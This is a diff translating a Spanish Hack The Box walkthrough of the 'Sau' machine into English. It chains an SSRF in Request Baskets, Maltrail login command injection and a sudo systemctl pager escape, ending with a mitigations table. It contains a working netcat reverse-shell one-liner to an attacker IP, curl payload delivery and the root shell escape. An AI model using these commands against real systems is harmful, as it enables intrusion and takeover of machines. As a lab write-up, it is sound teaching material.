@@ -2,14 +2,14 @@
 title: "HTB Walkthrough: Sau"
 date: 2026-07-13
 draft: false
-description: "Walkthrough completo de la máquina Sau de Hack The Box. Dificultad Easy, OS Linux. SSRF en Request Baskets (CVE-2023-27163) para pivotar a Maltrail v0.53 en localhost, RCE no autenticada vía inyección en el login, y escalada a root explotando el escape de pager en systemctl status (CVE-2023-26604)."
+description: "Full walkthrough of the Sau machine from Hack The Box. Easy difficulty, Linux. SSRF on Request Baskets (CVE-2023-27163) to pivot to Maltrail v0.53 on localhost, unauthenticated RCE via login injection, and root escalation exploiting the pager escape in systemctl status (CVE-2023-26604)."
 tags: ["HackTheBox", "Linux", "Easy", "SSRF", "RequestBaskets", "CVE-2023-27163", "Maltrail", "RCE", "CommandInjection", "systemd", "CVE-2023-26604", "sudo", "PrivEsc", "PagerEscape", "sau", "writeups"]
 categories: ["HTB Walkthroughs"]
 series: ["HackTheBox CPTS"]
 ---
 
 {{< lead >}}
-Resolución de **Sau** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Linux**. Un SSRF en Request Baskets v1.2.1 (CVE-2023-27163) nos permite pivotar hacia Maltrail v0.53, un servicio de detección de tráfico malicioso accesible solo desde localhost. Maltrail tiene una RCE no autenticada en su endpoint de login que nos da shell como `puma`. La escalada a root explota el **CVE-2023-26604**: `systemctl status` ejecutado con `sudo` invoca `less` como pager heredando privilegios de root, del que escapamos con `!/bin/bash`.
+Walkthrough of **Sau** on Hack The Box. **Easy** difficulty machine running **Linux**. An SSRF in Request Baskets v1.2.1 (CVE-2023-27163) lets us pivot to Maltrail v0.53, a malicious traffic detection service accessible only from localhost. Maltrail has an unauthenticated RCE in its login endpoint that gives us a shell as `puma`. Escalation to root exploits **CVE-2023-26604**: `systemctl status` run via `sudo` invokes `less` as a pager inheriting root privileges, which we escape with `!/bin/bash`.
 {{< /lead >}}
 
 {{< badge >}}HackTheBox{{< /badge >}}
@@ -18,21 +18,21 @@ Resolución de **Sau** en Hack The Box. Máquina de dificultad **Easy** con sist
 
 ---
 
-## 🗺️ Información de la Máquina
+## 🗺️ Machine Info
 
-| Campo          | Detalle                                                                                             |
+| Field          | Detail                                                                                              |
 |----------------|-----------------------------------------------------------------------------------------------------|
-| **Nombre**     | Sau                                                                                                 |
+| **Name**       | Sau                                                                                                 |
 | **OS**         | Linux                                                                                               |
-| **Dificultad** | Easy                                                                                                |
+| **Difficulty** | Easy                                                                                                |
 | **IP**         | 10.129.229.26                                                                                       |
-| **Técnicas**   | CVE-2023-27163 · SSRF · Maltrail RCE · CVE-2023-26604 · sudo Pager Escape                         |
+| **Techniques** | CVE-2023-27163 · SSRF · Maltrail RCE · CVE-2023-26604 · sudo Pager Escape                         |
 
 ---
 
-## 1. Reconocimiento
+## 1. Reconnaissance
 
-### 1.1 Escaneo de Puertos
+### 1.1 Port Scan
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.229.26
@@ -44,7 +44,7 @@ PORT      STATE SERVICE
 55555/tcp open  unknown
 ```
 
-Escaneo de versiones sobre los puertos abiertos:
+Version scan on open ports:
 
 ```bash
 nmap -sC -sV -p22,55555 10.129.229.26
@@ -57,51 +57,51 @@ PORT      STATE SERVICE VERSION
 |_http-title: Request Baskets
 ```
 
-*Puertos abiertos:*
-- `22` → SSH, sin exploits públicos conocidos
-- `55555` → Servicio Golang que redirige a `/web` — **Request Baskets**
+*Open ports:*
+- `22` → SSH, no known public exploits
+- `55555` → Golang service redirecting to `/web` — **Request Baskets**
 
-> **💡 Superficie de ataque:** Solo dos puertos. Toda la investigación inicial pasa por el servicio web en el 55555.
+> **💡 Attack surface:** Only two ports. All initial research goes through the web service on 55555.
 
 ---
 
-## 2. Identificación de la Aplicación — Request Baskets v1.2.1
+## 2. Application Identification — Request Baskets v1.2.1
 
-Visitando `http://10.129.229.26:55555/web` confirmamos la aplicación y su versión.
+Visiting `http://10.129.229.26:55555/web` confirms the application and its version.
 
-![Request Baskets — pantalla principal de creación de cesta](/img/sau1.png)
+![Request Baskets — basket creation main screen](/img/sau1.png)
 
 ```
 Powered by request-baskets | Version: 1.2.1
 ```
 
-**¿Qué es Request Baskets?** Una herramienta que crea "cestas" (baskets) HTTP configurables para capturar, inspeccionar y **reenviar (proxy)** peticiones a una URL de destino. Esta funcionalidad de reenvío es exactamente el vector de ataque.
+**What is Request Baskets?** A tool that creates configurable HTTP "baskets" to capture, inspect, and **proxy** requests to a target URL. This forwarding functionality is exactly the attack vector.
 
-> **⚠️ Vulnerabilidad identificada:** Request Baskets v1.2.1 es vulnerable a **CVE-2023-27163**, un **SSRF (Server-Side Request Forgery)**: el campo `forward_url` de la configuración de una cesta no restringe el destino, permitiendo que el propio servidor realice peticiones HTTP hacia direcciones internas (`127.0.0.1`, redes privadas) en nombre del atacante.
+> **⚠️ Vulnerability identified:** Request Baskets v1.2.1 is vulnerable to **CVE-2023-27163**, an **SSRF (Server-Side Request Forgery)**: the `forward_url` field in a basket's configuration doesn't restrict the destination, allowing the server itself to make HTTP requests to internal addresses (`127.0.0.1`, private networks) on behalf of the attacker.
 
 ---
 
-## 3. Explotación — SSRF vía Request Baskets (CVE-2023-27163)
+## 3. Exploitation — SSRF via Request Baskets (CVE-2023-27163)
 
-### 3.1 Paso 1 — Crear una Cesta y Verificar el SSRF
+### 3.1 Step 1 — Create a Basket and Verify the SSRF
 
-Desde `/web` creamos una nueva cesta. La aplicación asigna un nombre aleatorio (p. ej. `h68nagt`). Configuramos el `forward_url` hacia nuestra IP de VPN con `Proxy Response` y `Expand Forward Path` activados:
+From `/web` we create a new basket. The application assigns a random name (e.g. `h68nagt`). We configure `forward_url` pointing to our VPN IP with `Proxy Response` and `Expand Forward Path` enabled:
 
-![Configuración de la cesta apuntando a nuestra IP de VPN para confirmar el SSRF](/img/sau2.png)
+![Basket configuration pointing to our VPN IP to confirm SSRF](/img/sau2.png)
 
-Abrimos un listener:
+We open a listener:
 
 ```bash
 nc -lnvp 80
 ```
 
-Disparamos la petición contra la cesta:
+We trigger a request against the basket:
 
 ```bash
 curl http://10.129.229.26:55555/h68nagt
 ```
 
-El listener recibe la petición reenviada por el servidor objetivo:
+The listener receives the request forwarded by the target server:
 
 ```
 Listening on 0.0.0.0 80
@@ -112,39 +112,39 @@ User-Agent: curl/8.14.1
 X-Do-Not-Forward: 1
 ```
 
-> ✅ **SSRF confirmado.** El servidor objetivo realizó la petición HTTP por nosotros. La cabecera `X-Do-Not-Forward: 1` es una protección interna de Request Baskets para evitar bucles de reenvío — no impide dirigir el proxy hacia destinos internos.
+> ✅ **SSRF confirmed.** The target server made the HTTP request on our behalf. The `X-Do-Not-Forward: 1` header is an internal Request Baskets protection to prevent forwarding loops — it doesn't prevent directing the proxy to internal destinations.
 
-### 3.2 Paso 2 — Pivotar hacia el Servicio Interno
+### 3.2 Step 2 — Pivot to the Internal Service
 
-Reconfiguramos la cesta para apuntar a `http://127.0.0.1:80` — el localhost de la máquina objetivo, en un puerto que **no apareció en el escaneo Nmap** porque solo escucha en loopback:
+We reconfigure the basket to point to `http://127.0.0.1:80` — the target machine's localhost, on a port that **didn't appear in the Nmap scan** because it only listens on loopback:
 
-![Configuración de la cesta apuntando a 127.0.0.1:80 para pivotar al servicio interno](/img/sau3.png)
+![Basket configuration pointing to 127.0.0.1:80 to pivot to the internal service](/img/sau3.png)
 
-Al repetir la petición contra la cesta, la respuesta reenviada revela la aplicación local:
+Repeating the request against the basket, the forwarded response reveals the local application:
 
-![Maltrail v0.53 descubierto tras el pivotaje SSRF a localhost](/img/sau4.png)
+![Maltrail v0.53 discovered after SSRF pivot to localhost](/img/sau4.png)
 
-**Maltrail v0.53** — un sistema de detección de tráfico malicioso.
+**Maltrail v0.53** — a malicious traffic detection system.
 
-> **💡 Por qué funciona:** El puerto 80 solo está expuesto en `127.0.0.1`, invisible desde el exterior. Pero el SSRF hace que sea el **propio servidor** quien realiza la conexión, no nosotros — para el kernel de la máquina objetivo, la petición viene de sí misma, por lo que el filtro de loopback no aplica.
+> **💡 Why this works:** Port 80 is only exposed on `127.0.0.1`, invisible from the outside. But the SSRF makes **the server itself** make the connection, not us — from the target machine's kernel, the request comes from itself, so the loopback filter doesn't apply.
 
-> **⚠️ Vulnerabilidad identificada:** Maltrail v0.53 tiene una **RCE no autenticada** en el endpoint `/login`: el parámetro `username` se pasa sin sanitizar a un comando de sistema (`logger`), permitiendo inyección de comandos mediante sustitución de subshell (`` `...` ``).
+> **⚠️ Vulnerability identified:** Maltrail v0.53 has an **unauthenticated RCE** on the `/login` endpoint: the `username` parameter is passed unsanitized to a system command (`logger`), allowing command injection via subshell substitution (`` `...` ``).
 
 ---
 
-## 4. Explotación — RCE No Autenticada en Maltrail
+## 4. Exploitation — Unauthenticated RCE on Maltrail
 
-### 4.1 Construcción del Payload
+### 4.1 Payload Construction
 
-Codificamos la reverse shell en base64 para evitar problemas con caracteres especiales en la petición:
+We base64-encode the reverse shell to avoid issues with special characters in the request:
 
 ```bash
 ENC=$(echo -n "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.211 4444 >/tmp/f" | base64 -w0)
 ```
 
-### 4.2 Envío a través del SSRF
+### 4.2 Delivery via SSRF
 
-Aprovechamos la cesta SSRF (configurada para reenviar a `127.0.0.1:80`) para entregar el payload al endpoint de login de Maltrail:
+We leverage the SSRF basket (configured to forward to `127.0.0.1:80`) to deliver the payload to Maltrail's login endpoint:
 
 ```bash
 curl 'http://10.129.229.26:55555/h68nagt/login' \
@@ -155,9 +155,9 @@ curl 'http://10.129.229.26:55555/h68nagt/login' \
 Login failed
 ```
 
-> **💡 Lógica del payload:** El campo `username` cierra el contexto esperado por el comando `logger` e inyecta una sustitución de subshell que decodifica el payload en base64 y lo ejecuta con `sh`. La respuesta `Login failed` es el comportamiento normal — el comando ya se ejecutó en segundo plano antes de que la lógica de login termine de procesarse.
+> **💡 Payload logic:** The `username` field closes the context expected by the `logger` command and injects a subshell substitution that decodes the base64 payload and executes it with `sh`. The `Login failed` response is normal behavior — the command already executed in the background before the login logic finishes processing.
 
-### 4.3 Recepción de la Shell
+### 4.3 Receiving the Shell
 
 ```bash
 nc -lnvp 4444
@@ -171,7 +171,7 @@ $ whoami
 puma
 ```
 
-Estabilizamos la TTY:
+TTY stabilization:
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -181,7 +181,7 @@ export TERM=xterm; export SHELL=bash
 stty rows 40 cols 150; reset
 ```
 
-✅ **Shell obtenida como `puma`.**
+✅ **Shell obtained as `puma`.**
 
 ---
 
@@ -191,13 +191,13 @@ stty rows 40 cols 150; reset
 puma@sau:~$ cat ~/user.txt
 ```
 
-> 🔑 Flag de usuario obtenida.
+> 🔑 User flag obtained.
 
 ---
 
-## 6. Escalada de Privilegios — CVE-2023-26604 (Escape de Pager en systemctl)
+## 6. Privilege Escalation — CVE-2023-26604 (Pager Escape in systemctl)
 
-### 6.1 Enumeración de Permisos sudo
+### 6.1 Sudo Permission Enumeration
 
 ```bash
 puma@sau:~$ sudo -l
@@ -216,9 +216,9 @@ puma@sau:~$ systemctl --version
 systemd 245 (245.4-4ubuntu3.22)
 ```
 
-> **⚠️ Vulnerabilidad identificada (CVE-2023-26604):** Cuando la salida de `systemctl status` supera el alto de la terminal, `systemd` invoca automáticamente un **pager** (`less`) para paginarla. Si el comando fue ejecutado mediante `sudo`, ese `less` hereda los **privilegios de root**. `less` permite ejecutar comandos de shell arbitrarios con `!<comando>`, heredando esos mismos privilegios.
+> **⚠️ Vulnerability identified (CVE-2023-26604):** When `systemctl status` output exceeds the terminal height, `systemd` automatically invokes a **pager** (`less`) to paginate it. If the command was run via `sudo`, that `less` inherits **root privileges**. `less` allows executing arbitrary shell commands with `!<command>`, inheriting those same privileges.
 
-### 6.2 Ejecución del Exploit
+### 6.2 Exploit Execution
 
 ```bash
 puma@sau:~$ sudo /usr/bin/systemctl status trail.service
@@ -236,7 +236,7 @@ puma@sau:~$ sudo /usr/bin/systemctl status trail.service
            └─1342 pager
 ```
 
-La salida se abre paginada mediante `less`, ejecutado en el árbol de procesos de `sudo` — con privilegios de root. Dentro del pager escribimos:
+The output opens paginated via `less`, executed in the `sudo` process tree — with root privileges. Inside the pager we type:
 
 ```
 !/bin/bash
@@ -247,7 +247,7 @@ root@sau:/opt/maltrail# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-✅ **Escalada a root completada.**
+✅ **Escalation to root completed.**
 
 ---
 
@@ -257,39 +257,39 @@ uid=0(root) gid=0(root) groups=0(root)
 root@sau:~# cat /root/root.txt
 ```
 
-> 🏁 Flag de root obtenida.
+> 🏁 Root flag obtained.
 
 ---
 
-## 8. Resumen y Lecciones Aprendidas
+## 8. Summary and Lessons Learned
 
-**Ruta de compromiso:**
+**Compromise path:**
 
-1. **Recon** → Puerto 55555 con Request Baskets v1.2.1.
-2. **CVE-2023-27163** → SSRF via `forward_url` → confirmado reenviando petición a nuestra IP.
-3. **Pivotaje** → Reenvío hacia `127.0.0.1:80` → Maltrail v0.53 descubierto (solo accesible en localhost).
-4. **Maltrail RCE** → Inyección de comandos en parámetro `username` del login → reverse shell como `puma`.
+1. **Recon** → Port 55555 with Request Baskets v1.2.1.
+2. **CVE-2023-27163** → SSRF via `forward_url` → confirmed by forwarding request to our IP.
+3. **Pivot** → Forward to `127.0.0.1:80` → Maltrail v0.53 discovered (only accessible on localhost).
+4. **Maltrail RCE** → Command injection in `username` parameter of the login → reverse shell as `puma`.
 5. **User flag** → `~/user.txt`.
-6. **CVE-2023-26604** → `sudo systemctl status` invoca `less` como pager con privilegios de root → `!/bin/bash` → root.
+6. **CVE-2023-26604** → `sudo systemctl status` invokes `less` as pager with root privileges → `!/bin/bash` → root.
 
-**Lo que aprendí con esta máquina:**
+**What I learned from this machine:**
 
-- **"Solo escucha en localhost" no es una barrera de seguridad si hay un SSRF en otro servicio.** El puerto 80 de Maltrail era invisible para un escáner externo, pero el SSRF convertía al propio servidor en nuestro proxy. La segmentación de red interna tiene que complementar la restricción de binding — un servicio sin autenticación en loopback sigue siendo vulnerable si hay otro servicio explotable en la misma máquina.
+- **"Only listens on localhost" is not a security barrier if there's an SSRF in another service.** Port 80 of Maltrail was invisible to an external scanner, but the SSRF turned the server itself into our proxy. Internal network segmentation must complement binding restrictions — an unauthenticated service on loopback is still vulnerable if there's another exploitable service on the same machine.
 
-- **Un SSRF es a menudo el primer eslabón de una cadena, no el ataque en sí.** El valor del CVE-2023-27163 no estaba en el SSRF per se sino en lo que había detrás: un servicio más peligroso que solo era alcanzable a través de él. La metodología de pivotaje (confirmar SSRF → escanear rangos internos → identificar servicios ocultos) es el patrón a seguir siempre que se encuentre un SSRF.
+- **SSRF is often the first link in a chain, not the attack itself.** The value of CVE-2023-27163 wasn't in the SSRF per se but in what was behind it: a more dangerous service only reachable through it. The pivot methodology (confirm SSRF → scan internal ranges → identify hidden services) is the pattern to follow whenever an SSRF is found.
 
-- **La inyección de comandos en parámetros de logging es un error clásico y vigente.** Maltrail usaba `logger` para registrar los intentos de login fallidos pasando el `username` sin sanitizar. Cualquier llamada a un comando externo que incluya input de usuario sin pasar por una lista de argumentos (`subprocess.run([...])` en Python, equivalentes en otros lenguajes) es potencialmente vulnerable. En Maltrail el fix correcto habría sido usar los argumentos de `subprocess` como lista, no como string de shell.
+- **Command injection in logging parameters is a classic, still-relevant error.** Maltrail used `logger` to record failed login attempts, passing `username` unsanitized. Any call to an external command that includes user input without going through an argument list (`subprocess.run([...])` in Python, equivalents in other languages) is potentially vulnerable. The correct fix in Maltrail would have been to use `subprocess` arguments as a list, not as a shell string.
 
-- **CVE-2023-26604 ilustra por qué los pagers interactivos son peligrosos en contextos de sudo.** `less` es útil, pero cuando se invoca con privilegios elevados se convierte en un vector de escape trivial — `!comando` lo convierte efectivamente en un shell con esos privilegios. La corrección es siempre pasar `--no-pager` o fijar `SYSTEMD_PAGER=cat` en las reglas de sudoers para cualquier comando de systemd que se ejecute con sudo.
+- **CVE-2023-26604 illustrates why interactive pagers are dangerous in sudo contexts.** `less` is useful, but when invoked with elevated privileges it becomes a trivial escape vector — `!command` effectively turns it into a shell with those privileges. The fix is always to pass `--no-pager` or set `SYSTEMD_PAGER=cat` in sudoers rules for any systemd command run via sudo.
 
-- **La cadena completa de esta máquina son dos CVEs de 2023 encadenados.** Ninguno de los dos es sofisticado aisladamente — uno es un proxy mal restringido, el otro es un pager que lanza shells. El valor está en reconocer el patrón: cuando sudo permite ejecutar algo que a su vez puede abrir un proceso interactivo (pager, editor, intérprete), hay que investigar si ese proceso hereda privilegios.
+- **This machine's full chain is two 2023 CVEs chained together.** Neither is sophisticated in isolation — one is a poorly restricted proxy, the other is a pager that launches shells. The value is in recognizing the pattern: when sudo permits executing something that can in turn open an interactive process (pager, editor, interpreter), investigate whether that process inherits privileges.
 
-**Mitigaciones:**
+**Mitigations:**
 
-| Vector | Mitigación |
+| Vector | Mitigation |
 |--------|------------|
-| CVE-2023-27163 — SSRF en Request Baskets | Actualizar a versión parcheada; validar y restringir destinos de `forward_url` (bloquear rangos privados y loopback) |
-| Maltrail en localhost sin autenticación | No asumir que loopback es seguro; aplicar autenticación en todos los servicios independientemente del binding |
-| RCE en el login de Maltrail (inyección en `logger`) | Actualizar Maltrail; usar listas de argumentos en llamadas a subprocesos — nunca interpolar input de usuario en strings de shell |
-| `sudo` NOPASSWD sobre `systemctl status` | Añadir `--no-pager` o fijar `SYSTEMD_PAGER=cat` en la regla de sudoers; evitar permisos sudo sobre comandos que invoquen pagers interactivos |
-| CVE-2023-26604 — escape de pager con privilegios heredados | Actualizar systemd a versión parcheada (≥ 247); configurar `PAGER=cat` para comandos ejecutables via sudo |
+| CVE-2023-27163 — SSRF in Request Baskets | Update to patched version; validate and restrict `forward_url` destinations (block private ranges and loopback) |
+| Maltrail on localhost without authentication | Don't assume loopback is secure; apply authentication to all services regardless of binding |
+| RCE in Maltrail login (injection in `logger`) | Update Maltrail; use argument lists in subprocess calls — never interpolate user input into shell strings |
+| `sudo` NOPASSWD on `systemctl status` | Add `--no-pager` or set `SYSTEMD_PAGER=cat` in the sudoers rule; avoid sudo permissions on commands that invoke interactive pagers |
+| CVE-2023-26604 — pager escape with inherited privileges | Update systemd to patched version (≥ 247); configure `PAGER=cat` for sudo-executable commands |
